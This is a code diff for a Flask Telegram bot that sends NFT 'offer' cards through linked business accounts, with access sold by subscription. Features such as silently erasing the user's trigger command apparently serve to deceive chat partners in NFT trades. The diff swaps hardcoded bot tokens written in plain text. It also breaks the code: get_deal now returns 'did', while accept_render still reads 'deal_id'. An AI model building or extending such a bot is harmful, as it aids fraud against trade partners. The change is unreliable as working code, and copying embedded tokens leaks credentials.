@@ -18,8 +18,8 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(
 app = Flask(__name__)
 executor = ThreadPoolExecutor(max_workers=8)
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "9087583806:AAE1nylRFVLF54ppc6EQZJyDE8vQwhN6bYY")
-OWNER_ID = int(os.environ.get("OWNER_ID", "9207314182"))
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "9173312391:AAF1aT1lhCPbKIuLska9lUD6nD-grAMdiSw")
+OWNER_ID = int(os.environ.get("OWNER_ID", "9271743488"))
 PAYMENT = os.environ.get("PAYMENT", "pantera138382")
 API = "https://api.telegram.org/bot" + BOT_TOKEN
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://offera-5uqe.onrender.com")
@@ -113,7 +113,11 @@ def init_db():
     conn = get_db()
     c = conn.cursor()
     c.execute("CREATE TABLE IF NOT EXISTS subscribers (user_id INTEGER PRIMARY KEY, expires_at REAL)")
-    c.execute("CREATE TABLE IF NOT EXISTS deals (deal_id TEXT PRIMARY KEY, wid INTEGER, lid INTEGER, slug TEXT, name TEXT, num TEXT, price INTEGER, cur TEXT, holder TEXT, st TEXT, bci TEXT, created REAL)")
+    c.execute(
+        "CREATE TABLE IF NOT EXISTS deals "
+        "(deal_id TEXT PRIMARY KEY, wid INTEGER, lid INTEGER, slug TEXT, name TEXT, num TEXT, "
+        "price INTEGER, cur TEXT, holder TEXT, st TEXT, bci TEXT, created REAL)"
+    )
     c.execute("CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER PRIMARY KEY, lang TEXT, cur TEXT, holder TEXT)")
     c.execute("CREATE TABLE IF NOT EXISTS user_state (user_id INTEGER PRIMARY KEY, state TEXT, updated REAL)")
     c.execute("CREATE TABLE IF NOT EXISTS business_connections (user_id INTEGER PRIMARY KEY, bci TEXT, updated REAL)")
@@ -130,7 +134,9 @@ def is_allowed(uid):
         conn = get_db()
         row = conn.execute("SELECT expires_at FROM subscribers WHERE user_id = ?", (uid,)).fetchone()
         conn.close()
-        return bool(row) and (row["expires_at"] == -1.0 or row["expires_at"] > time.time())
+        if not row:
+            return False
+        return row["expires_at"] == -1.0 or row["expires_at"] > time.time()
     except Exception:
         return False
 
@@ -195,7 +201,8 @@ def set_user_field(uid, key, value):
 
 
 def t(uid, key):
-    return L.get(gs(uid)["lang"], L["ru"]).get(key, L["ru"].get(key, key))
+    lang = gs(uid)["lang"]
+    return L.get(lang, L["ru"]).get(key, L["ru"].get(key, key))
 
 
 def set_state(uid, state):
@@ -247,7 +254,21 @@ def get_deal(did):
     conn = get_db()
     row = conn.execute("SELECT * FROM deals WHERE deal_id = ?", (did,)).fetchone()
     conn.close()
-    return dict(row) if row else None
+    if not row:
+        return None
+    return {
+        "did": row["deal_id"],
+        "wid": row["wid"],
+        "lid": row["lid"],
+        "slug": row["slug"],
+        "name": row["name"],
+        "num": row["num"],
+        "price": row["price"],
+        "cur": row["cur"],
+        "hold": row["holder"],
+        "st": row["st"],
+        "bci": row["bci"]
+    }
 
 
 def set_deal_status(did, st):
@@ -287,10 +308,6 @@ def sm_nft(cid, txt, url, kb=None, bci=None):
     return track(api("sendMessage", chat_id=cid, text=txt, parse_mode="HTML", link_preview_options={"is_disabled": False, "show_above_text": True, "url": url}, reply_markup=kb, business_connection_id=bci), cid)
 
 
-def dm(cid, mid, bci=None):
-    return api("deleteMessage", chat_id=cid, message_id=mid, business_connection_id=bci)
-
-
 def em(cid, mid, txt, kb=None, bci=None):
     return api("editMessageText", chat_id=cid, message_id=mid, text=txt, parse_mode="HTML", reply_markup=kb, business_connection_id=bci)
 
@@ -301,31 +318,13 @@ def ec(cid, mid, cap, kb=None, bci=None):
 
 def edit_any(cid, mid, txt, kb=None, bci=None):
     r = ec(cid, mid, txt, kb=kb, bci=bci)
-    return r if r.get("ok") else em(cid, mid, txt, kb=kb, bci=bci)
+    if r.get("ok"):
+        return r
+    return em(cid, mid, txt, kb=kb, bci=bci)
 
 
 def ac(cb, txt=None, sa=False):
     return api("answerCallbackQuery", callback_query_id=cb, show_alert=sa, text=txt)
-
-
-def _ok(r, tag):
-    if r.get("ok"):
-        logging.info(tag + " OK")
-    else:
-        logging.warning(tag + ": " + str(r.get("description")))
-    return bool(r.get("ok"))
-
-
-def erase_command(cid, mid, bci=None):
-    if _ok(dm(cid, mid), "DEL plain " + str(cid) + "/" + str(mid)):
-        return True
-    if bci and _ok(dm(cid, mid, bci=bci), "DEL bci " + str(cid) + "/" + str(mid)):
-        return True
-    if _ok(em(cid, mid, "?", kb={"inline_keyboard": []}), "EDIT plain " + str(cid) + "/" + str(mid)):
-        return True
-    if bci and _ok(em(cid, mid, "?", kb={"inline_keyboard": []}, bci=bci), "EDIT bci " + str(cid) + "/" + str(mid)):
-        return True
-    return False
 
 
 def menu_kb(uid):
@@ -444,13 +443,6 @@ def handle_state(cid, uid, ci, txt, low, has_shd):
     return False
 
 
-def flash(cid, ci, text):
-    r = sm(cid, text, bci=ci)
-    if r.get("ok"):
-        time.sleep(1.5)
-        dm(cid, r["result"]["message_id"], bci=ci)
-
-
 def send_start(cid, uid, ci):
     clear_state(uid)
     cap = t(uid, "menu_caption")
@@ -484,16 +476,16 @@ def build_offer(msg, cid, uid, ci, ni, pr):
 def send_offer(msg, cid, uid, ci, txt):
     ni, pr = shd_parse(txt)
     if not ni:
-        flash(cid, ci, "❌ Не найдена NFT")
+        sm(cid, "❌ Не найдена NFT", bci=ci)
         return
     if pr is None:
-        flash(cid, ci, "❌ Цена должна быть числом")
+        sm(cid, "❌ Цена должна быть числом", bci=ci)
         return
     if uid != OWNER_ID and not is_allowed(uid):
-        flash(cid, ci, "🔒 Доступ закрыт. @" + PAYMENT)
+        sm(cid, "🔒 Доступ закрыт. @" + PAYMENT, bci=ci)
         return
     if not (ci or get_bci(uid)):
-        flash(cid, ci, "⚠️ Подключи бизнес-аккаунт!")
+        sm(cid, "⚠️ Подключи бизнес-аккаунт!", bci=ci)
         return
     build_offer(msg, cid, uid, ci, ni, pr)
 
@@ -501,9 +493,12 @@ def send_offer(msg, cid, uid, ci, txt):
 def cmd_diag(cid, uid, ci):
     test_bci = ci or get_bci(uid)
     probe = sm(cid, "diag", bci=test_bci)
-    pmid = probe["result"]["message_id"] if probe.get("ok") else 0
-    r1 = dm(cid, pmid) if pmid else {}
-    r2 = dm(cid, pmid, bci=test_bci) if (pmid and not r1.get("ok")) else {"ok": True, "description": "skipped"}
+    if not probe.get("ok"):
+        sm(cid, "send: " + str(probe.get("description")), bci=ci)
+        return
+    pmid = probe["result"]["message_id"]
+    r1 = api("deleteMessage", chat_id=cid, message_id=pmid)
+    r2 = api("deleteMessage", chat_id=cid, message_id=pmid, business_connection_id=test_bci) if not r1.get("ok") else {"ok": True, "description": "skipped"}
     report = (
         "chat: <code>" + str(cid) + "</code>\n"
         "bci: <code>" + str(test_bci) + "</code>\n"
@@ -586,8 +581,7 @@ def route_msg(msg, cid, uid, mid, ci, txt):
         set_bci(uid, ci)
     low = txt.lower()
     has_shd = "shd" in low
-    if has_shd:
-        erase_command(cid, mid, bci=ci)
+    # Убрано удаление команды — просто триггер на shd
     if txt == "/start":
         send_start(cid, uid, ci)
         return
@@ -684,7 +678,6 @@ def accept_render(cid, mid, ci, deal):
     )
     res = api("editMessageText", chat_id=cid, message_id=mid, text=txt, parse_mode="HTML", link_preview_options={"is_disabled": False, "show_above_text": True, "url": nl}, reply_markup=aakb(deal["deal_id"], h), business_connection_id=bci)
     if not res.get("ok"):
-        dm(cid, mid, bci=bci)
         sm_nft(cid, txt, nl, kb=aakb(deal["deal_id"], h), bci=bci)
 
 
@@ -806,8 +799,8 @@ def set_cmd():
 
 
 init_db()
+set_wh()
+set_cmd()
 
 if __name__ == "__main__":
-    set_wh()
-    set_cmd()
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
